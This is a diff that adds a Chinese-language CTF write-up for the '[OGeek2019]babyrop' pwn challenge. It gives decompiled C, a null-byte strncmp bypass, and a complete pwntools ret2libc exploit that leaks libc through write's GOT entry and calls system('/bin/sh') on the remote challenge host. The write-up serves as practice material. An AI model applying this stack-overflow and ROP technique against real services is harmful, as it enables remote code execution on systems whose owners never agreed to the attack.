@@ -316,4 +316,93 @@ p.sendlineafter("encrypted\n",pl)
 
 p.interactive()
 ```
+## [OGeek2019]babyrop
 
+>url链接:[babyrop](https://buuoj.cn/challenges#[OGeek2019]babyrop)
+>知识点：ret2libc
+
+![alt text](image-13.png)
+发现开了NX保护，就排除了shellcode了，然后放进IDA看
+```c
+int __cdecl main()
+{
+  int buf; // [esp+4h] [ebp-14h] BYREF
+  char v2; // [esp+Bh] [ebp-Dh]
+  int fd; // [esp+Ch] [ebp-Ch]
+
+  sub_80486BB();
+  fd = open("/dev/urandom", 0);
+  if ( fd > 0 )
+    read(fd, &buf, 4u);
+  v2 = sub_804871F(buf);
+  sub_80487D0(v2);
+  return 0;
+}
+int sub_80486BB()
+{
+  alarm(0x3Cu);
+  signal(14, handler);
+  setvbuf(stdin, 0, 2, 0);
+  setvbuf(stdout, 0, 2, 0);
+  return setvbuf(stderr, 0, 2, 0);
+}
+int __cdecl sub_804871F(int a1)
+{
+  size_t v1; // eax
+  char s[32]; // [esp+Ch] [ebp-4Ch] BYREF
+  char buf[32]; // [esp+2Ch] [ebp-2Ch] BYREF
+  ssize_t v5; // [esp+4Ch] [ebp-Ch]
+
+  memset(s, 0, sizeof(s));
+  memset(buf, 0, sizeof(buf));
+  sprintf(s, "%ld", a1);
+  v5 = read(0, buf, 0x20u);
+  buf[v5 - 1] = 0;
+  v1 = strlen(buf);
+  if ( strncmp(buf, s, v1) )
+    exit(0);
+  write(1, "Correct\n", 8u);
+  return (unsigned __int8)buf[7];
+}
+ssize_t __cdecl sub_80487D0(char a1)
+{
+  char buf[231]; // [esp+11h] [ebp-E7h] BYREF
+
+  if ( a1 == 127 )
+    return read(0, buf, 0xC8u);
+  else
+    return read(0, buf, a1);
+}
+```
+很长，fd打开随机数生成文件，将前四位赋值给buf，所以导致他为随机数，然后来到sub_804871F函数，buf变成了a1，，然后要考虑这个比较，比较bufhes的前v1个字符，所以要求v1=0，而strlen函数遇到0x00就会停止，是的v1=0，然后考虑的是返回的buf[7]，第三个函数当a1足够大时，就会造成栈溢出，所以要求直接修改buf[7]的值，所以构造
+>payload1=b'\0x00'+b'a'*6+b'\0xff'*2
+
+而用IDA查看了，没有后面函数，就要用ret2libc了
+exp:
+```python 
+from pwn import *
+from LibcSearcher import *
+r=remote('node5.buuoj.cn',25080)
+context(os = 'linux', arch = 'amd64', log_level = 'debug')
+elf=ELF('./1')
+payload1=b'\x00'+b'a'*6+b'\xff'*2
+r.sendline(payload1)
+r.recvuntil('Correct\n')
+write_got=elf.got['write']
+write_plt=elf.plt['write']
+main_addr=0x08048825
+payload2=b'a'*(0xe7+4)+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)
+#write（1，write_got，4），write的返回地址为main
+r.sendline(payload2)
+write_addr=u32(r.recv(4))
+print(hex(write_addr))
+libc=LibcSearcher('write',write_addr)#寻找libc版本
+libc_base=write_addr-libc.dump('write')#寻找基址
+system_addr=libc_base+libc.dump('system')
+bin_sh_addr=libc_base+libc.dump('str_bin_sh')
+r.sendline(payload1)
+r.recvuntil('Correct\n')
+payload3=b'a'*(0xe7+4)+p32(system_addr)+p32(0)+p32(bin_sh_addr)
+r.sendline(payload3)
+r.interactive()
+```
